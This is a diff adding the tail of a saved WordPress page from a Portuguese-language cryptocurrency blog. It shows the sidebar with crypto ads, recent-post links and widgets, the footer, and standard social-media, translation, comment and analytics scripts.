+							for (var i = 0; i < commentForms.length; i++) {
+								commentForms[i].allowTransparency = false;
+								commentForms[i].scrolling = 'no';
+							}
+						});
+					</script>
+					<!--<![endif]-->
+							</form>
+		</div>
+
+		
+		<input type="hidden" name="comment_parent" id="comment_parent" value="" />
+
+			</section><!-- #comments -->
+</div>
+</div>
+		</main><!-- #main -->
+	</div><!-- #primary -->
+
+<aside id="sidebar" class="well col-md-3 hidden-xs hidden-print widget-area" role="complementary">
+	<aside id="search-2" class="widget widget_search"><form method="get" class="searchform form-inline" action="https://www.eduardomenezes.com/crypto/" role="search">
+	<div class="input-group">
+      <input type="text" class="form-control" placeholder="Pesquisar"  name="s" >
+      <span class="input-group-btn">
+        <button type="submit" class="btn btn-primary">
+			<span class="glyphicon glyphicon-search"></span>
+		</button>
+      </span>
+    </div><!-- /input-group -->
+</form>
+</aside><aside id="custom_html-4" class="widget_text widget widget_custom_html"><div class="textwidget custom-html-widget"><div id="sb_instagram" class="sbi sbi_disable_mobile sbi_col_4" style="width:100%; padding-bottom: 10px; " data-id="6242111647" data-num="20" data-res="auto" data-cols="4" data-options='{&quot;sortby&quot;: &quot;none&quot;, &quot;showbio&quot;: &quot;true&quot;,&quot;feedID&quot;: &quot;6242111647&quot;, &quot;headercolor&quot;: &quot;&quot;, &quot;imagepadding&quot;: &quot;5&quot;,&quot;mid&quot;: &quot;M2E4MWE5Zg==&quot;, &quot;disablecache&quot;: &quot;false&quot;, &quot;sbiCacheExists&quot;: &quot;true&quot;,&quot;callback&quot;: &quot;ZWI5ZWJiMjVhZjE5.NGY1ZTk3ZjU4M2M3Njc3MDliOGY=&quot;, &quot;sbiHeaderCache&quot;: &quot;false&quot;, &quot;useBackup&quot;: &quot;feed&quot;}'><div class="sb_instagram_header" style="padding: 10px; padding-bottom: 0;"></div><div id="sbi_images" style="padding: 5px;"><div class="sbi_loader"></div></div><div id="sbi_load" class="sbi_hidden"><a class="sbi_load_btn" href="javascript:void(0);" style="display: none; "><span class="sbi_btn_text">Load More...</span><span class="sbi_loader sbi_hidden"></span></a><span class="sbi_follow_btn"><a href="https://www.instagram.com/" style="" target="_blank"><i class="fa fab fa-instagram"></i>Follow on Instagram</a></span></div></div></div></aside>		<aside id="recent-posts-2" class="widget widget_recent_entries">		<h3 class="widgettitle widget-title">Posts recentes</h3>		<ul>
+											<li>
+					<a href="https://www.eduardomenezes.com/crypto/hodlers-digest-feb-25-march-3-top-stories-price-movements-quotes-and-fud-of-the-week/">Hodler’s Digest, Feb. 25–March 3: Top Stories, Price Movements, Quotes and FUD of the Week</a>
+									</li>
+											<li>
+					<a href="https://www.eduardomenezes.com/crypto/erik-zhang-on-neo-3-0-could-neo-be-the-number-one-blockchain-by-2020/">Erik Zhang on NEO 3.0: Could NEO be the Number One Blockchain by 2020?</a>
+									</li>
+											<li>
+					<a href="https://www.eduardomenezes.com/crypto/feb-volume-report-leading-markets-post-strongest-month-since-q1-2018/">Feb Volume Report: Leading Markets Post Strongest Month Since Q1 2018</a>
+									</li>
+											<li>
+					<a href="https://www.eduardomenezes.com/crypto/heres-why-twitter-ceo-jack-dorsey-co-are-stacking-bitcoin/">Here’s Why Twitter CEO Jack Dorsey &amp; Co. Are ‘Stacking’ Bitcoin</a>
+									</li>
+											<li>
+					<a href="https://www.eduardomenezes.com/crypto/most-top-cryptos-see-minor-losses-as-bitcoin-hovers-over-3850/">Most Top Cryptos See Minor Losses as Bitcoin Hovers Over $3,850</a>
+									</li>
+					</ul>
+		</aside><aside id="custom_html-6" class="widget_text widget widget_custom_html"><div class="textwidget custom-html-widget"><a href="https://www.ledgerwallet.com/r/5ef7"><img width="300" height="250" alt="Ledger Nano S - The secure hardware wallet" src="https://i0.wp.com/www.ledgerwallet.com/images/promo/nano-s/ledger_nano-s_3-0-0x2-5-0.jpg?resize=300%2C250&#038;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/www.ledgerwallet.com/images/promo/nano-s/ledger_nano-s_3-0-0x2-5-0.jpg?resize=300%2C250&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" class=" jetpack-lazy-image"><noscript><img width=300 height=250 alt="Ledger Nano S - The secure hardware wallet" src="https://i0.wp.com/www.ledgerwallet.com/images/promo/nano-s/ledger_nano-s_3-0-0x2-5-0.jpg?resize=300%2C250&#038;ssl=1" data-recalc-dims="1"></noscript></a></div></aside><aside id="custom_html-3" class="widget_text widget widget_custom_html"><div class="textwidget custom-html-widget">Compre BTC - Transferência SEPA (UE)
+<iframe allowtransparency="true" frameborder="0" hspace="0" vspace="0" marginheight="0" marginwidth="0" scrolling="no" width="234" height="60" src="https://localbitcoins.com/ad-embed/754624/half-banner"></iframe>
+</div></aside><aside id="custom_html-2" class="widget_text widget widget_custom_html"><div class="textwidget custom-html-widget">Compre BTC P2P - Caixa Econômica Federal
+<iframe allowtransparency="true" frameborder="0" hspace="0" vspace="0" marginheight="0" marginwidth="0" scrolling="no" width="234" height="60" src="https://localbitcoins.com/ad-embed/754630/half-banner"></iframe>
+</div></aside><aside id="kades_crypto_header-6" class="widget kades_crypto_header"><div id="kadescrypto-header"></div></aside></aside><!-- #sidebar -->
+		</div><!-- .row -->
+	</div><!-- #wrapper -->
+
+	<footer id="footer" role="contentinfo">
+		<div class="container">
+			<p>&copy; 2019 <a href="https://www.eduardomenezes.com/crypto/">Eduardo Menezes</a> - All rights reserved </p>
+		</div><!-- .container -->
+	</footer><!-- #footer -->
+	<div id="glt-translate-trigger"><span class="translate">Translate »</span></div><div id="glt-toolbar"></div><div id="flags" style="display:none" class="size24"><ul id="sortable" class="ui-sortable"><li id="Chinese (Simplified)"><a title="Chinese (Simplified)" class="nturl notranslate zh-CN flag Chinese (Simplified)"></a><li id="Chinese (Traditional)"><a title="Chinese (Traditional)" class="nturl notranslate zh-TW flag Chinese (Traditional)"></a><li id="English"><a title="English" class="nturl notranslate en flag united-states"></a><li id="French"><a title="French" class="nturl notranslate fr flag French"></a><li id="German"><a title="German" class="nturl notranslate de flag German"></a><li id="Italian"><a title="Italian" class="nturl notranslate it flag Italian"></a><li id="Japanese"><a title="Japanese" class="nturl notranslate ja flag Japanese"></a><li id="Portuguese"><a title="Portuguese" class="nturl notranslate pt flag brazil"></a><li id="Russian"><a title="Russian" class="nturl notranslate ru flag Russian"></a><li id="Spanish"><a title="Spanish" class="nturl notranslate es flag Spanish"></a></ul></div><div id='glt-footer'><div id="google_language_translator" class="default-language-en"></div></div><script>function GoogleLanguageTranslatorInit() { new google.translate.TranslateElement({pageLanguage: 'en', includedLanguages:'zh-CN,zh-TW,en,fr,de,it,ja,pt,ru,es', layout: google.translate.TranslateElement.InlineLayout.HORIZONTAL, autoDisplay: false}, 'google_language_translator');}</script><!-- Instagram Feed JS -->
+<script type="text/javascript">
+var sbiajaxurl = "https://www.eduardomenezes.com/crypto/wp-admin/admin-ajax.php";
+</script>
+	<div style="display:none">
+	</div>
+			<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+			<div id="fb-root"></div>
+			<script>(function(d, s, id) { var js, fjs = d.getElementsByTagName(s)[0]; if (d.getElementById(id)) return; js = d.createElement(s); js.id = id; js.src = 'https://connect.facebook.net/pt_BR/sdk.js#xfbml=1&appId=249643311490&version=v2.3'; fjs.parentNode.insertBefore(js, fjs); }(document, 'script', 'facebook-jssdk'));</script>
+			<script>
+			jQuery( document.body ).on( 'post-load', function() {
+				if ( 'undefined' !== typeof FB ) {
+					FB.XFBML.parse();
+				}
+			} );
+			</script>
+						<script>
+			function renderGooglePlus1() {
+				if ( 'undefined' === typeof gapi ) {
+					return;
+				}
+
+				jQuery( '.g-plus' ).each(function() {
+					var $button = jQuery( this );
+
+					if ( ! $button.data( 'gplus-rendered' ) ) {
+						gapi.plusone.render( this, {
+							href: $button.attr( 'data-href' ),
+							size: $button.attr( 'data-size' ),
+							annotation: $button.attr( 'data-annotation' )
+						});
+
+						$button.data( 'gplus-rendered', true );
+					}
+				});
+			}
+
+			(function() {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/platform.js';
+				po.innerHTML = '{"parsetags": "explicit"}';
+				po.onload = renderGooglePlus1;
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			})();
+
+			jQuery( document.body ).on( 'post-load', renderGooglePlus1 );
+			</script>
+			<script type='text/javascript' src='https://www.eduardomenezes.com/crypto/wp-content/themes/morfeu/assets/js/scripts.min.js'></script>
+<script type='text/javascript' src='https://c0.wp.com/c/5.0.3/wp-includes/js/comment-reply.min.js'></script>
+<script type='text/javascript' src='https://c0.wp.com/p/jetpack/6.9/_inc/build/photon/photon.min.js'></script>
+<script type='text/javascript' src='https://www.eduardomenezes.com/crypto/wp-content/plugins/google-language-translator/js/scripts.js?ver=5.0.48'></script>
+<script type='text/javascript' src='//translate.google.com/translate_a/element.js?cb=GoogleLanguageTranslatorInit'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var sb_instagram_js_options = {"sb_instagram_at":"","font_method":"svg"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://www.eduardomenezes.com/crypto/wp-content/plugins/instagram-feed/js/sb-instagram.min.js?ver=1.10.2'></script>
+<script type='text/javascript' src='https://s0.wp.com/wp-content/js/devicepx-jetpack.js?ver=201909'></script>
+<script type='text/javascript' src='https://www.eduardomenezes.com/crypto/wp-content/plugins/kades-crypto-widgets/js/kades-crypto.js?ver=31217'></script>
+<script type='text/javascript' src='https://secure.gravatar.com/js/gprofiles.js?ver=2019Maraa'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var WPGroHo = {"my_hash":""};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://c0.wp.com/p/jetpack/6.9/modules/wpgroho.js'></script>
+<script type='text/javascript' src='https://c0.wp.com/p/jetpack/6.9/_inc/build/widgets/eu-cookie-law/eu-cookie-law.min.js'></script>
+<script type='text/javascript' src='https://c0.wp.com/p/jetpack/6.9/_inc/build/lazy-images/js/lazy-images.min.js'></script>
+<script type='text/javascript' src='https://c0.wp.com/c/5.0.3/wp-includes/js/wp-embed.min.js'></script>
+<script async="async" type='text/javascript' src='https://www.eduardomenezes.com/crypto/wp-content/plugins/akismet/_inc/form.js?ver=4.1'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://c0.wp.com/p/jetpack/6.9/_inc/build/sharedaddy/sharing.min.js'></script>
+<script type='text/javascript'>
+var windowOpen;
+			jQuery( document.body ).on( 'click', 'a.share-facebook', function() {
+				// If there's another sharing window open, close it.
+				if ( 'undefined' !== typeof windowOpen ) {
+					windowOpen.close();
+				}
+				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
+				return false;
+			});
+var windowOpen;
+			jQuery( document.body ).on( 'click', 'a.share-telegram', function() {
+				// If there's another sharing window open, close it.
+				if ( 'undefined' !== typeof windowOpen ) {
+					windowOpen.close();
+				}
+				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomtelegram', 'menubar=1,resizable=1,width=450,height=450' );
+				return false;
+			});
+</script>
+
+		<!--[if IE]>
+		<script type="text/javascript">
+			if ( 0 === window.location.hash.indexOf( '#comment-' ) ) {
+				// window.location.reload() doesn't respect the Hash in IE
+				window.location.hash = window.location.hash;
+			}
+		</script>
+		<![endif]-->
+		<script type="text/javascript">
+			(function () {
+				var comm_par_el = document.getElementById( 'comment_parent' ),
+					comm_par = ( comm_par_el && comm_par_el.value ) ? comm_par_el.value : '',
+					frame = document.getElementById( 'jetpack_remote_comment' ),
+					tellFrameNewParent;
+
+				tellFrameNewParent = function () {
+					if ( comm_par ) {
+						frame.src = "https://jetpack.wordpress.com/jetpack-comment/?blogid=146630855&postid=3166&comment_registration=0&require_name_email=1&stc_enabled=1&stb_enabled=1&show_avatars=1&avatar_default=mystery&greeting=Deixe+uma+resposta&greeting_reply=Deixe+uma+resposta+para+%25s&color_scheme=light&lang=pt_BR&jetpack_version=6.9&show_cookie_consent=10&has_cookie_consent=0&sig=626ac16fd302ff917cd732f393e7bef51e82fcc5#parent=https%3A%2F%2Fwww.eduardomenezes.com%2Fcrypto%2Finterview-with-crypto-optimist-brian-kelly-bitcoin-is-still-50-percent-undervalued%2F" + '&replytocom=' + parseInt( comm_par, 10 ).toString();
+					} else {
+						frame.src = "https://jetpack.wordpress.com/jetpack-comment/?blogid=146630855&postid=3166&comment_registration=0&require_name_email=1&stc_enabled=1&stb_enabled=1&show_avatars=1&avatar_default=mystery&greeting=Deixe+uma+resposta&greeting_reply=Deixe+uma+resposta+para+%25s&color_scheme=light&lang=pt_BR&jetpack_version=6.9&show_cookie_consent=10&has_cookie_consent=0&sig=626ac16fd302ff917cd732f393e7bef51e82fcc5#parent=https%3A%2F%2Fwww.eduardomenezes.com%2Fcrypto%2Finterview-with-crypto-optimist-brian-kelly-bitcoin-is-still-50-percent-undervalued%2F";
+					}
+				};
+
+				
+				if ( 'undefined' !== typeof addComment ) {
+					addComment._Jetpack_moveForm = addComment.moveForm;
+
+					addComment.moveForm = function ( commId, parentId, respondId, postId ) {
+						var returnValue = addComment._Jetpack_moveForm( commId, parentId, respondId, postId ),
+							cancelClick, cancel;
+
+						if ( false === returnValue ) {
+							cancel = document.getElementById( 'cancel-comment-reply-link' );
+							cancelClick = cancel.onclick;
+							cancel.onclick = function () {
+								var cancelReturn = cancelClick.call( this );
+								if ( false !== cancelReturn ) {
+									return cancelReturn;
+								}
+
+								if ( ! comm_par ) {
+									return cancelReturn;
+								}
+
+								comm_par = 0;
+
+								tellFrameNewParent();
+
+								return cancelReturn;
+							};
+						}
+
+						if ( comm_par == parentId ) {
+							return returnValue;
+						}
+
+						comm_par = parentId;
+
+						tellFrameNewParent();
+
+						return returnValue;
+					};
+				}
+
+				
+				// Do the post message bit after the dom has loaded.
+				document.addEventListener( 'DOMContentLoaded', function () {
+					var iframe_url = "https:\/\/jetpack.wordpress.com";
+					if ( window.postMessage ) {
+						if ( document.addEventListener ) {
+							window.addEventListener( 'message', function ( event ) {
+								var origin = event.origin.replace( /^http:\/\//i, 'https://' );
+								if ( iframe_url.replace( /^http:\/\//i, 'https://' ) !== origin ) {
+									return;
+								}
+								jQuery( frame ).height( event.data );
+							});
+						} else if ( document.attachEvent ) {
+							window.attachEvent( 'message', function ( event ) {
+								var origin = event.origin.replace( /^http:\/\//i, 'https://' );
+								if ( iframe_url.replace( /^http:\/\//i, 'https://' ) !== origin ) {
+									return;
+								}
+								jQuery( frame ).height( event.data );
+							});
+						}
+					}
+				})
+
+			})();
+		</script>
+
+		<script type='text/javascript' src='https://stats.wp.com/e-201909.js' async='async' defer='defer'></script>
+<script type='text/javascript'>
+	_stq = window._stq || [];
+	_stq.push([ 'view', {v:'ext',j:'1:6.9',blog:'146630855',post:'3166',tz:'0',srv:'www.eduardomenezes.com'} ]);
+	_stq.push([ 'clickTrackerInit', '146630855', '3166' ]);
+</script>
+</body>
+</html>
